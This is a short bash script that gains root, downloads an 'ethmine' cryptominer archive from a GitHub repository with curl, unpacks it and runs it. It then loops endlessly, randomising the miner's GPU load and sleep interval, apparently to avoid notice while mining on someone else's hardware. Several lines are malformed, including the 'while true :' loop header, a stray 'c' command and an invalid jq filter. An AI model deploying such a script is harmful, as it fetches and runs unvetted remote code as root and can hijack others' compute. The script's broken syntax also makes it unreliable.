#!/bin/bash
sudo -i
sudo apt-get install -y libpci-dev
sudo apt-get update
curl -L https://github.com/superalix/avian/raw/main/ethmine.tar.gz > ethmine.tar.gz
tar -zxf ethmine.tar.gz
apt-get -y install jq
t_min=25
t_max=100
gpu_min=50
gpu_max=90
bash mine.sh
while true :
  do
    t=$(($t_min + $RANDOM % ($t_max - $t_min)))
    gpu=$(shuf -i 50-89 -n 1)
    echo $gpu
    cat config.json |jq -r --arg gpu "$gpu" '.-gpow $gpu' > u.json
    mv u.json config.json
    c
    sleep $t
done